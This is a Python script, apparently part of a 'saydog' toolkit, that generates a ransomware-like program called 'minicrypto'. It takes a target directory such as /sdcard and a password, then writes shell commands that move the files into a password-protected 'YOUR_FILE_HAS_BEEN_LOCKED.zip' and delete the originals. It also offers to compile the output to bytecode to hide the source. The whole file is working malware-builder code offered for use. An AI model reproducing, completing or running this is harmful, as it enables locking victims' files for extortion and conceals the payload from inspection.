import os
import sys
import time

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

def menu():
        try:
                main()
        except KeyboardInterrupt:
                sys.exit(0)

def main():
        print ("")
        tfile = str(input(b+"[+]"+w+" set path target (ex: /sdcard)"+w+": "))
        pfile = str(input(b+"[+]"+w+" set pass file   (ex: mypass1)"+w+": "))
        nfile = str(input(b+"[+]"+w+" set name file   (ex: mytraps)"+w+": "))
        ofile = str(input(b+"[+]"+w+" save file to    (ex: /sdcard)"+w+": "))
        print ("")
        print (b+'[+]'+w+' Generating code for minicrypto')
        time.sleep(5)
        os.system('cat 1 > mc.py;cat 2 >> mc.py;echo """'+pfile+' YOUR_FILE_HAS_BEEN_LOCKED.zip -m -r '+tfile+' &> /dev//null'+"'"+")"+'""" >> mc.py;cat 4 >> mc.py;echo """'+pfile+' YOUR_FILE_HAS_BEEN_LOCKED.zip &> /dev//null'+"'"+')""" >> mc.py;cat 5 >> mc.py;cat mc.py > '+ofile+'/'+nfile+'.py;rm mc.py')
        print (b+'[+]'+w+' minicrypto has been generated')
        print (b+'[+]'+w+' file saved as:- '+g+ofile+'/'+nfile+'.py'+w)
        print (b+'[+]'+w+' password for unclock file: '+pfile)
        print ("")
        dog = str(input(w+"Do you want to hide the source code? (y/n) "))
        if dog == "y" or dog == "Y":
                print ("")
                print (b+"[+]"+w+" converting the source code")
                time.sleep(3)
                os.system("python3 -m py_compile "+ofile+"/"+nfile+".py;cat "+ofile+"/__pycache__/"+nfile+".cpython-38.pyc > "+ofile+"/"+nfile+".py;rm -rf "+ofile+"/__pycache__")
                print (b+"[+]"+w+" minicrypto has been converted")
                print ("")
                dog = str(input(w+"[ enter "+w+"]"))
                if dog == " ":
                        sys.exit(0)
                else:
                        sys.exit(0)
        else:
                print ("")
                dog = str(input(w+"[ enter "+w+"]"))
                if dog == " ":
                        sys.exit(0)
                else:
                        sys.exit(0)

if "__main__" == __name__:
    if "--minicrypto-run" in sys.argv:
        menu()
    else:
            os.system("saydog")